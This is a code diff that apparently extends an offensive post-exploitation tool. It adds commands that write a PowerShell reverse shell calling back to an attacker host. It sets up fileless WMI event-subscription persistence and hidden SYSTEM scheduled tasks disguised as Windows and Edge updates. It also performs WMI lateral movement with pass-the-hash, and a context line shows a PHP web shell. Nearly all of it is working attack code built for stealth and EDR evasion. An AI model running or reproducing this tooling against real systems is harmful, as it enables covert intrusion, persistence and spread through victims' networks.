@@ -104,3 +104,165 @@ if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
             f.write(code)
         print_msg("[+] Windows reverse shell C code at sessions/revshell.c")
         print_msg("[+] Compile: x86_64-w64-mingw32-gcc -o revshell.exe sessions/revshell.c -lws2_32")
+
+    @cmd2.with_category(persistence_category)
+    def do_wmi_persist(self, line=""):
+        """Create WMI Event Subscription persistence (fileless, no disk write).
+
+        Usage: wmi_persist [--command <cmd>] [--interval <minutes>] [--name <event_name>]
+
+        Registers __EventFilter + __EventConsumer + __FilterToConsumerBinding
+        for stealthy, fileless persistence. Triggers on system startup or
+        at a configurable interval. MITRE: T1546.003 WMI Event Subscription.
+        """
+        import shlex as _shlex
+        args = _shlex.split(line) if line else []
+
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        event_name = self._extract(args, "--name") or "WindowsUpdate"
+        command = self._extract(args, "--command") or (
+            f"powershell -ep bypass -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
+            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+            f"while(($i=$s.Read($b,0,$b.Length))-ne0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+            f"$r=(iex $d 2>&1|Out-String);$v=$r+'PS '+(pwd).Path+'> ';"
+            f"$y=([text.encoding]::ASCII).GetBytes($v);$s.Write($y,0,$y.Length);$s.Flush()}};$c.Close()\""
+        )
+        interval = self._extract(args, "--interval") or "5"
+
+        ps_script = f"""$FilterArgs = @{{
+    Name = '{event_name}Filter'
+    EventNamespace = 'root\\cimv2'
+    QueryLanguage = 'WQL'
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN {interval} WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}}
+$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $FilterArgs
+
+$ConsumerArgs = @{{
+    Name = '{event_name}Consumer'
+    CommandLineTemplate = '{command}'
+}}
+$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $ConsumerArgs
+
+$BindingArgs = @{{
+    Filter = $Filter
+    Consumer = $Consumer
+}}
+$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $BindingArgs
+
+Write-Host "[+] WMI Persistence established: {event_name}" -ForegroundColor Green
+Write-Host "[+] Check: Get-WmiObject __EventFilter -Namespace root\\subscription | fl Name"
+"""
+
+        output_path = "sessions/wmi_persistence.ps1"
+        with open(output_path, "w") as f:
+            f.write(ps_script)
+        print_msg(f"[+] WMI persistence script saved to {output_path}")
+        print_msg(f"[+] Event name: {event_name}")
+        print_msg(f"[+] Interval: {interval} minutes")
+        print_msg(f"[+] Run on target: powershell -ExecutionPolicy Bypass -File {output_path}")
+
+    @cmd2.with_category(persistence_category)
+    def do_wmi_lateral(self, line=""):
+        """Execute a command on a remote host via WMI.
+
+        Usage: wmi_lateral [--target <ip>] [--user <user>] [--password <pass>] [--hash <nt_hash>] [--command <cmd>]
+
+        Uses wmic.exe or impacket-wmiexec for lateral movement.
+        Supports pass-the-hash authentication.
+        MITRE: T1047 WMI.
+        """
+        import shlex as _shlex
+        args = _shlex.split(line) if line else []
+
+        target = self._extract(args, "--target") or self.params.get("rhost", "")
+        user = self._extract(args, "--user") or self.params.get("username", "")
+        password = self._extract(args, "--password") or self.params.get("password", "")
+        nt_hash = self._extract(args, "--hash")
+        command = self._extract(args, "--command") or "whoami /all"
+
+        if not target:
+            print_error("Usage: wmi_lateral --target <ip> [--user <u>] [--password <p>] [--hash <nt_hash>] [--command <cmd>]")
+            return
+
+        if nt_hash:
+            print_msg(f"Executing via WMI (PTH) on {target}")
+            self.cmd(f"impacket-wmiexec -hashes :{nt_hash} -target-ip {target} {user or 'Administrator'}@{target} '{command}'")
+        elif user and password:
+            print_msg(f"Executing via WMI on {target}")
+            self.cmd(f"impacket-wmiexec -target-ip {target} {user}:'{password}'@{target} '{command}'")
+        else:
+            self.cmd(f"wmic /node:{target} /user:{user or 'Administrator'} /password:'{password}' process call create '{command}'")
+
+    @cmd2.with_category(persistence_category)
+    def do_wmi_scheduled_task(self, line=""):
+        """Create a scheduled task for persistence via WMI.
+
+        Usage: wmi_scheduled_task [--name <task_name>] [--command <cmd>] [--trigger <startup|logon|daily|hourly>]
+
+        Creates a scheduled task that executes on system startup or user logon.
+        More stealthy than registry Run keys (not monitored by many EDRs).
+        MITRE: T1053.005 Scheduled Task.
+        """
+        import shlex as _shlex
+        args = _shlex.split(line) if line else []
+
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        task_name = self._extract(args, "--name") or "MicrosoftEdgeUpdateTaskUA"
+        trigger = self._extract(args, "--trigger") or "startup"
+        command = self._extract(args, "--command") or (
+            f"powershell -ep bypass -w hidden -c \""
+            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
+            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+            f"while(($i=$s.Read($b,0,$b.Length))-ne0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+            f"$r=(iex $d 2>&1|Out-String);$v=$r+'PS '+(pwd).Path+'> ';"
+            f"$y=([text.encoding]::ASCII).GetBytes($v);$s.Write($y,0,$y.Length);$s.Flush()}}\""
+        )
+
+        ps_script = f"""$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ep bypass -w hidden -c "{command}"'
+
+$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
+$TriggerParams = @{{
+    TaskName = '{task_name}'
+    Action = $Action
+    Principal = $Principal
+}}
+
+switch ('{trigger}') {{
+    'startup' {{
+        $Trigger = New-ScheduledTaskTrigger -AtStartup
+        Register-ScheduledTask @TriggerParams -Trigger $Trigger -Description "System component update"
+    }}
+    'logon' {{
+        $Trigger = New-ScheduledTaskTrigger -AtLogOn
+        Register-ScheduledTask @TriggerParams -Trigger $Trigger -Description "User session helper"
+    }}
+    'daily' {{
+        $Trigger = New-ScheduledTaskTrigger -Daily -At "09:00"
+        Register-ScheduledTask @TriggerParams -Trigger $Trigger -Description "Daily maintenance task"
+    }}
+    'hourly' {{
+        $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration ([TimeSpan]::MaxValue)
+        Register-ScheduledTask @TriggerParams -Trigger $Trigger -Description "Metrics collector service"
+    }}
+}}
+
+Write-Host "[+] Scheduled task '{task_name}' created with trigger: {trigger}" -ForegroundColor Green
+Write-Host "[+] Check: Get-ScheduledTask -TaskName '{task_name}'"
+"""
+
+        output_path = "sessions/scheduled_task_persist.ps1"
+        with open(output_path, "w") as f:
+            f.write(ps_script)
+        print_msg(f"[+] Scheduled task persistence saved to {output_path}")
+        print_msg(f"[+] Task name: {task_name}, Trigger: {trigger}")
+
+    @staticmethod
+    def _extract(args: list[str], flag: str) -> str | None:
+        try:
+            idx = args.index(flag)
+            return args[idx + 1]
+        except (ValueError, IndexError):
+            return None
